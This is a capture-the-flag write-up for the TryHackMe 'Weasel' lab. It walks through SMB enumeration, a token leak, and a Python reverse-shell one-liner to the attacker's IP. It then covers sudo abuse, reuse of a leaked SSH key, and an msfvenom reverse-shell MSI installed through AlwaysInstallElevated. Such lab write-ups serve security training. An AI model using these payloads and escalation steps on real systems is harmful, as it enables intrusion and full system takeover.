---
title: "TryHackMe - Weasel"
author: Nasrallah
description: ""
date: 2024-10-11 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, medium, wsl, sudo, msfvenom, smb]
img_path: /assets/img/tryhackme/weasel
image:
    path: weasel.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Weasel](https://tryhackme.com/room/weasel) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) has a beautiful mix between linux and windows. We start by finding jupyter token on an smb share allowing us to login and get a reverse shell on a wsl linux machine. On the box we find an ssh key that gives us access to the windows, after that we find a security misconfiguration on windows that allows us to install applications with as system so we create a malicious file with msfvenom, install it and get a shell as system.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.220.169                                                             
Host is up (0.094s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION    
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:                      
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?                                                                   
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP 
| Not valid before: 2024-10-05T10:42:38
|_Not valid after:  2025-04-06T10:42:38                                                        
|_ssl-date: 2024-10-06T10:47:17+00:00; -1s from scanner time.
| rdp-ntlm-info:    
|   Target_Name: DEV-DATASCI-JUP                                                               
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-06T10:47:09+00:00
8888/tcp open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
|_http-server-header: TornadoServer/6.0.3
| http-robots.txt: 1 disallowed entry 
|_/ 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-10-06T10:47:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

The target is a windows machines with ssh, smb, rdp and http on port 8888.

### Web

Let's navigate to the website on port 8888

![website](1.png)

It's a jupyter Notebook, and we need a token to able to login.

### SMB

Let's see what we can find on smb.

```terminal
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/weasel]
└──╼ [★]$ nxc smb 10.10.220.169 -u 'guest' -p '' --shares
SMB         10.10.220.169   445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)          
SMB         10.10.220.169   445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest:
SMB         10.10.220.169   445    DEV-DATASCI-JUP  [*] Enumerated shares
SMB         10.10.220.169   445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.220.169   445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.220.169   445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.220.169   445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.220.169   445    DEV-DATASCI-JUP  datasci-team    READ,WRITE
SMB         10.10.220.169   445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
```

We found a share called `datasci-team` where we have read and write permission over.

Let's connect to the share and see what we can find.

```terminal
$ smbclient //10.10.220.169/datasci-team -N
smb: \> ls                                                                                                                                                                                    
  .                                   D        0  Sun Oct  6 11:48:28 2024                                                                                                                    
  ..                                  D        0  Sun Oct  6 11:48:28 2024                                                                                                                    
  .ipynb_checkpoints                 DA        0  Thu Aug 25 16:26:47 2022                                                                                                                    
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 16:26:46 2022                                                                                                 
  misc                               DA        0  Thu Aug 25 16:26:47 2022                                                                                                                    
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 16:26:46 2022                                                                                                                    
  papers                             DA        0  Thu Aug 25 16:26:47 2022                                                                                                                    
  pics                               DA        0  Thu Aug 25 16:26:47 2022                                                                                                                    
  requirements.txt                    A       12  Thu Aug 25 16:26:46 2022                                                                                                                    
  weasel.ipynb                        A     4308  Thu Aug 25 16:26:46 2022                                                                                                                    
  weasel.txt                          A       51  Thu Aug 25 16:26:46 2022        
smb: \> cd misc                                                                                                                                                                               
smb: \misc\> ls                                                                                                                                                                               
  .                                  DA        0  Thu Aug 25 16:26:47 2022                                                                                                                    
  ..                                 DA        0  Thu Aug 25 16:26:47 2022                                                                                                                    
  jupyter-token.txt                   A       52  Thu Aug 25 16:26:47 2022                                                                                                                    
                                                                                                                                                                                              
                15587583 blocks of size 4096. 8950540 blocks available                                                                                                                        
smb: \misc\> get jupyter-token.txt                                                                                                                                                            
getting file \misc\jupyter-token.txt of size 52 as jupyter-token.txt (0.1 KiloBytes/sec) (average 4.5 KiloBytes/sec)                                                                          
```

We were able to find the token, let's print it out

```terminal
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/weasel]                                                                                                                                          
└──╼ [★]$ cat jupyter-token.txt                                                                                                                                                               
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a 
```

Now we go back and login

![loggedin](2.png)

## **Foothold**

To get a shell we click on `new` and select `python3`. This will give us a prompt to execute python commands.

We can use the following command to get a shell.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.4.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![shell](3.png)

We got a shell on linux?! But the machine is windows, this must be a container of some sort.

## **Privilege Escalation**

Let's check our privileges.

```terminal
(base) dev-datasci@DEV-DATASCI-JUP:/$ sudo -l                                                                                                                                                 
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:                                                                                                                                 
    env_reset, mail_badpass,                                                                                                                                                                  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                  
                                                                                                                                                                                              
User dev-datasci may run the following commands on DEV-DATASCI-JUP:                                                                                                                           
    (ALL : ALL) ALL                                                                                                                                                                           
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci                                                                                                                 
        -c *                        
```

We can run `/home/dev-datasci/.local/bin/jupyter` as root.

I check the file but it doesn't exist so I created a one that runs /bin/bash

```terminal
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ echo '/bin/bash' > jupyter                                                                                                                   
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ chmod +x jupyter                                                                                                                             
in/jupyter                                                                                                                                                                                    
root@DEV-DATASCI-JUP:/home/dev-datasci/.local/bin# id                                                                                                                                         
uid=0(root) gid=0(root) groups=0(root) 
```

We got root, but it's not the end.

I wasn't able to find any flags, let's do some more enumeration.

On `/home/dev-datasci/` directory we find a ssh private key.

```terminal
(base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25519                                                                                                                      
-----BEGIN OPENSSH PRIVATE KEY-----                                                                                                                                                           
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
[...]
-----END OPENSSH PRIVATE KEY-----
(base) dev-datasci@DEV-DATASCI-JUP:~$
```

I tried connecting as `dev-datasci` but it didn't work, but after a second look, we see the file has the name `dev-datasci-lowpriv`

```terminal
$ ssh dev-datasci-lowpriv@10.10.220.169 -i sshkey                                                                                                                                     
Microsoft Windows [Version 10.0.17763.3287]                                                                                                                                                   
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                                          
                                                                                                                                                                                              
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>whoami                                                                                                                       
dev-datasci-jup\dev-datasci-lowpriv                                                                                                                                                           
                                                                                                                                                                                              
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>
```

Great! We got access to the windows machine.

Now back on the linux box(it's wsl BTW), if we check the `/mnt` directory we find `c`

```terminal
root@DEV-DATASCI-JUP:~# cd /mnt/
root@DEV-DATASCI-JUP:/mnt# ls
c       
```

The folder was empty, I'm guessing it's the c drive of windows, so let's try mounting it `mount -t drvfs C: /mnt/c`.

```terminal
root@DEV-DATASCI-JUP:~# mount -t drvfs C: /mnt/c
root@DEV-DATASCI-JUP:~# cd /mnt/c/                                                             
root@DEV-DATASCI-JUP:/mnt/c# ls                                                                
ls: cannot read symbolic link 'Documents and Settings': Permission denied                    
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'            'Program Files (x86)'         Users
'Documents and Settings'   ProgramData                  Windows
 PerfLogs                  Recovery                     datasci-team
'Program Files'           'System Volume Information'   pagefile.sys
root@DEV-DATASCI-JUP:/mnt/c#
```

Great! Now we can easily grab the flag from the administrator's desktop.

We completed the lab, but we can still try to get as system shell.

Let's run `winpeas.exe`

![winpeas](4.png)

![win](5.png)

We found `dev-datasci-lowpriv` password

We also found `AlwaysInstallElevated` is set to 1.

> AlwaysInstallElevated is a policy to install a Windows Installer package with elevated (system) privileges.
{: .prompt-info }

Let's create a reverse shell msi file.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f msi > setup.msi
```

We upload the file and install it using the following command.

```terminal
runas /user:dev-datasci-lowpriv "msiexec  /qn /i C:\Users\dev-datasci-lowpriv\Downloads\setup.msi"
```

We will be prompt for a password so we put the one we found.

![system](6.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References
